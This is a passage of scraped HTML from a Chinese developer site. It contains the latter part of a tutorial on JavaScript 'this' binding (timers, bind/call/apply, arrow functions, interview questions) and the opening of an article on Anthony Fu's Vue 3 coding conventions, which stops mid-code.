<h4 data-id="heading-5">2.1 对象方法调用</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> a = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Cherry"</span>,
  <span class="hljs-attr">func1</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
}

a.<span class="hljs-title function_">func1</span>(); <span class="hljs-comment">// "Cherry"</span>
</code></pre>
<p><strong>关键理解：</strong> 这里的<code>this</code>指向了对象<code>a</code>。因为<code>func1</code>是由<code>a</code>调用的。</p>
<h4 data-id="heading-6">2.2 经典面试题 - 定时器中的this</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 2.html 中的例子</span>
<span class="hljs-keyword">var</span> a = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Cherry"</span>,
  <span class="hljs-attr">func1</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">func2</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func1</span>(); <span class="hljs-comment">// 这里会报错！</span>
    }, <span class="hljs-number">3000</span>)
  }
}

a.<span class="hljs-title function_">func2</span>(); <span class="hljs-comment">// TypeError: this.func1 is not a function</span>
</code></pre>
<p><strong>为什么报错？</strong></p>
<p>定时器的回调函数是由<strong>定时器内部</strong>调用的，此时<code>this</code>指向了<code>window</code>对象。而<code>window</code>对象上并没有<code>func1</code>方法（虽然有全局变量<code>func1</code>，但这里调用的是对象方法）。</p>
<p><strong>验证一下：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> a = {
  <span class="hljs-comment">// ... 同上</span>
  <span class="hljs-attr">func2</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// window</span>
    }, <span class="hljs-number">3000</span>)
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-7">第三章：解决this丢失的三种方案</h3>
<h4 data-id="heading-8">3.1 方案一：保存this（that = this）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 3.html 中的例子</span>
<span class="hljs-keyword">var</span> a = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Cherry"</span>,
  <span class="hljs-attr">func1</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">func2</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> that = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 保存外层的this</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      that.<span class="hljs-title function_">func1</span>(); <span class="hljs-comment">// "Cherry" ✅</span>
    }, <span class="hljs-number">3000</span>)
  }
}

a.<span class="hljs-title function_">func2</span>(); <span class="hljs-comment">// 3秒后输出 "Cherry"</span>
</code></pre>
<p><strong>原理：</strong> 利用闭包的特性，内部函数可以访问外部函数的变量。<code>that</code>保存了正确的<code>this</code>引用。</p>
<h4 data-id="heading-9">3.2 方案二：bind绑定</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 2.html 中的例子</span>
<span class="hljs-keyword">var</span> a = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Cherry"</span>,
  <span class="hljs-attr">func1</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">func2</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func1</span>(); 
    }.<span class="hljs-title function_">bind</span>(a), <span class="hljs-number">3000</span>) <span class="hljs-comment">// bind永久绑定this为a</span>
  }
}

a.<span class="hljs-title function_">func2</span>(); <span class="hljs-comment">// 3秒后输出 "Cherry" ✅</span>
</code></pre>
<p><strong>重要区别：</strong></p>
<ul>
<li><code>bind()</code>：<strong>不会立即执行</strong>，返回一个新函数，永久绑定this</li>
<li><code>call()</code>/<code>apply()</code>：<strong>立即执行</strong>函数，临时绑定this</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 对比演示</span>
a.<span class="hljs-property">func1</span>.<span class="hljs-title function_">call</span>(a); <span class="hljs-comment">// 立即执行</span>
<span class="hljs-keyword">const</span> boundFunc = a.<span class="hljs-property">func1</span>.<span class="hljs-title function_">bind</span>(a); <span class="hljs-comment">// 返回绑定后的函数，不执行</span>
<span class="hljs-title function_">boundFunc</span>(); <span class="hljs-comment">// 执行时this已经绑定为a</span>
</code></pre>
<h4 data-id="heading-10">3.3 方案三：箭头函数</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 4.html 中的例子</span>
<span class="hljs-keyword">var</span> a = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Cherry"</span>,
  <span class="hljs-attr">func1</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">func2</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// a对象 ✅</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func1</span>(); <span class="hljs-comment">// "Cherry" ✅</span>
    }, <span class="hljs-number">3000</span>)
  }
}

a.<span class="hljs-title function_">func2</span>(); <span class="hljs-comment">// 3秒后输出 "Cherry"</span>
</code></pre>
<p><strong>箭头函数的特点：</strong></p>
<ul>
<li>没有自己的<code>this</code></li>
<li>继承<strong>定义时</strong>所在作用域的<code>this</code></li>
<li><code>this</code>是静态的，不会改变</li>
</ul>
<hr/>
<h3 data-id="heading-11">第四章：深入理解箭头函数</h3>
<h4 data-id="heading-12">4.1 箭头函数没有自己的this</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 5.html 中的例子</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">func</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// window（在浏览器环境）</span>
}

<span class="hljs-title function_">func</span>(); <span class="hljs-comment">// window</span>
</code></pre>
<h4 data-id="heading-13">4.2 箭头函数不能作为构造函数</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">func</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);
}

<span class="hljs-keyword">new</span> <span class="hljs-title function_">func</span>(); <span class="hljs-comment">// TypeError: func is not a constructor ❌</span>
</code></pre>
<p><strong>为什么？</strong>
箭头函数没有自己的<code>this</code>，也没有<code>prototype</code>属性，无法进行实例化。</p>
<h4 data-id="heading-14">4.3 关于arguments对象</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">func</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>); <span class="hljs-comment">// ReferenceError ❌</span>
}

<span class="hljs-comment">// 箭头函数也没有自己的arguments对象</span>
<span class="hljs-comment">// 但可以这样获取参数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">func2</span> = (<span class="hljs-params">...args</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args); <span class="hljs-comment">// [1, 2, 3] ✅</span>
}

<span class="hljs-title function_">func2</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);
</code></pre>
<hr/>
<h3 data-id="heading-15">第五章：综合实践 - 分析一段复杂代码</h3>
<p>让我们来分析1.html中的代码，它包含了多个知识点的综合运用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> name = <span class="hljs-string">"windowName"</span>;
<span class="hljs-keyword">var</span> func1 = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'func1'</span>);
}
<span class="hljs-keyword">var</span> a = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Cherry"</span>,
  <span class="hljs-attr">func1</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">func2</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func1</span>(); <span class="hljs-comment">// 这里原本有问题</span>
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hahaha'</span>);
      }
    }.<span class="hljs-title function_">call</span>(a), <span class="hljs-number">3000</span>) <span class="hljs-comment">// ⚠️ 注意：这里用了call</span>
  }
}
</code></pre>
<p><strong>这里有个坑：</strong></p>
<p><code>setTimeout</code>的第一个参数应该是<strong>函数</strong>，但<code>.call(a)</code>会<strong>立即执行</strong>这个函数，并把返回值作为第一个参数传给<code>setTimeout</code>。这里返回的是<code>undefined</code>，相当于：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 实际执行效果</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-literal">undefined</span>, <span class="hljs-number">3000</span>)
</code></pre>
<p><strong>正确写法：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用bind（不会立即执行）</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func1</span>();
}.<span class="hljs-title function_">bind</span>(a), <span class="hljs-number">3000</span>)

<span class="hljs-comment">// 或者使用箭头函数</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">func1</span>(); <span class="hljs-comment">// 这里的this继承自func2</span>
}, <span class="hljs-number">3000</span>)
</code></pre>
<hr/>
<h3 data-id="heading-16">第六章：面试题精选</h3>
<h4 data-id="heading-17">6.1 经典组合题</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> name = <span class="hljs-string">'window'</span>;

<span class="hljs-keyword">var</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'obj'</span>,
  <span class="hljs-attr">fn1</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">fn2</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">fn3</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
    }
  },
  <span class="hljs-attr">fn4</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
    }
  }
}

obj.<span class="hljs-title function_">fn1</span>();      <span class="hljs-comment">// 'obj' - 对象方法调用</span>
obj.<span class="hljs-title function_">fn2</span>();      <span class="hljs-comment">// 'window' - 箭头函数，this指向外层window</span>
obj.<span class="hljs-title function_">fn3</span>()();    <span class="hljs-comment">// 'window' - 独立函数调用</span>
obj.<span class="hljs-title function_">fn4</span>()();    <span class="hljs-comment">// 'obj' - 箭头函数，this继承自fn4的this</span>
</code></pre>
<h4 data-id="heading-18">6.2 优先级问题</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
}

<span class="hljs-keyword">const</span> obj1 = { <span class="hljs-attr">name</span>: <span class="hljs-string">'obj1'</span>, foo };
<span class="hljs-keyword">const</span> obj2 = { <span class="hljs-attr">name</span>: <span class="hljs-string">'obj2'</span> };

obj1.<span class="hljs-title function_">foo</span>();                 <span class="hljs-comment">// 'obj1'</span>
obj1.<span class="hljs-property">foo</span>.<span class="hljs-title function_">call</span>(obj2);       <span class="hljs-comment">// 'obj2' - call优先于隐式绑定</span>
<span class="hljs-keyword">const</span> bound = foo.<span class="hljs-title function_">bind</span>(obj1);
bound.<span class="hljs-title function_">call</span>(obj2);          <span class="hljs-comment">// 'obj1' - bind绑定后，call无法改变</span>
</code></pre>
<p><strong>this绑定优先级：</strong></p>
<ol>
<li><code>new</code>绑定（最高）</li>
<li><code>call</code>/<code>apply</code>/<code>bind</code>显式绑定</li>
<li>对象方法调用（隐式绑定）</li>
<li>默认绑定（独立函数调用，最低）</li>
</ol>
<hr/>
<h3 data-id="heading-19">总结</h3>
<p>this的指向规律其实很简单，记住这几点：</p>
<ol>
<li><strong>函数被调用时才能确定this指向</strong></li>
<li><strong>普通函数：谁调用我，我指向谁</strong></li>
<li><strong>箭头函数：我在哪里定义，this就跟谁一样</strong></li>
<li><strong>可以通过<code>bind</code>永久绑定this，<code>call</code>/<code>apply</code>临时绑定this</strong></li>
</ol>
<p>理解了这些，JavaScript的this问题就迎刃而解了。</p>
<hr/>
<h3 data-id="heading-20">练习题</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 尝试分析下面的输出</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'obj'</span>,
  <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
    }, <span class="hljs-number">100</span>);
  }
}

obj.<span class="hljs-title function_">say</span>(); <span class="hljs-comment">// 输出什么？</span>

<span class="hljs-keyword">const</span> say = obj.<span class="hljs-property">say</span>;
<span class="hljs-title function_">say</span>(); <span class="hljs-comment">// 输出什么？</span>
</code></pre>
<p>答案和解析欢迎在评论区讨论！</p>
<hr/>
<p>如果你觉得这篇文章对你有帮助，请点赞👍收藏⭐，让更多的小伙伴看到！我们下期再见！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Anthony Fu 的 Vue3 开发规范完整解读]]></title>    <link>https://juejin.cn/post/7605848213602418734</link>    <guid>https://juejin.cn/post/7605848213602418734</guid>    <pubDate>2026-02-12T13:59:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602418734" data-draft-id="7605711582430216243" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Anthony Fu 的 Vue3 开发规范完整解读"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-12T13:59:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="扉川川"/> <meta itemprop="url" content="https://juejin.cn/user/464465970359547"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Anthony Fu 的 Vue3 开发规范完整解读
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/464465970359547/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    扉川川
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T13:59:38.000Z" title="Thu Feb 12 2026 13:59:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Anthony Fu 的 Vue3 开发规范完整解读</h2>
<p>本文基于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fantfu%2Fskills" target="_blank" title="https://github.com/antfu/skills" ref="nofollow noopener noreferrer">antfu/skills</a> 仓库整理翻译，全面解析 Anthony Fu 在 Vue 3 生态中的编码规范、最佳实践和工具链推荐。作为 Vue 核心团队成员、Vite 团队成员以及众多开源项目的作者（VueUse、UnoCSS、Vitest、Slidev 等），Anthony 的开发理念深刻影响了现代 Vue 开发生态。</p>
<h3 data-id="heading-1">第一部分：编码实践与工具链</h3>
<h4 data-id="heading-2">代码组织原则</h4>
<p><strong>单一职责原则</strong></p>
<p>保持文件和函数专注于单一职责。当文件超过 200-300 行时，考虑拆分：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ❌ 避免：一个文件包含所有逻辑</span>
<span class="hljs-comment">// UserManager.ts (800 lines)</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserManager</span> {
  <span class="hljs-title function_">validateUser</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* 50 lines */</span> }
  <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* 100 lines */</span> }
  <span class="hljs-title function_">updateUserProfile</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* 150 lines */</span> }
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// ✅ 推荐：按职责拆分</span>
<span class="hljs-comment">// validation.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateUser</span>(<span class="hljs-params">user: User</span>) { <span class="hljs-comment">/* ... */</span> }

<span class="hljs-comment">// api.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) { <span class="hljs-comment">/* ... */</span> }

<span class="hljs-comment">// profile.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateUserProfile</span>(<span class="hljs-params">data: ProfileData</span>) { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<p><strong>类型与常量分离</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// types.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">role</span>: <span class="hljs-title class_">UserRole</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">UserRole</span> = <span class="hljs-string">'admin'</span> | <span class="hljs-string">'user'</span> | <span class="hljs-string">'guest'</span>

<span class="hljs-comment">// constants.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_PAGE_SIZE</span> = <span class="hljs-number">20</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_RETRIES</span> = <span class="hljs-number">3</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_ENDPOINTS</span> = {
  <span class="hljs-attr">users</span>: <span class="hljs-string">'/api/users'</span>,
  <span class="hljs-attr">posts</span>: <span class="hljs-string">'/api/posts'</span>,
} <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>

<span class="hljs-comment">// user-service.ts</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">User</span>, <span class="hljs-title class_">UserRole</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./types'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">API_ENDPOINTS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./constants'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUsers</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span>[]&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-variable constant_">API_ENDPOINTS</span>.<span class="hljs-property">users</span>)
  <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>()
}
</code></pre>
<h4 data-id="heading-3">运行时环境标注</h4>
<p>编写同构代码时，为环境特定的代码添加明确的注释：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ✅ 明确标注环境依赖</span>
<span class="hljs-comment">// @env browser</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getWindowSize</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>,
  }
}

<span class="hljs-comment">// @env node</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readConfigFile</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'./config.json'</span>, <span class="hljs-string">'utf-8'</span>)
}

<span class="hljs-comment">// ✅ 同构代码无需标注</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">formatDate</span>(<span class="hljs-params">date: <span class="hljs-built_in">Date</span></span>): <span class="hljs-built_in">string</span> {
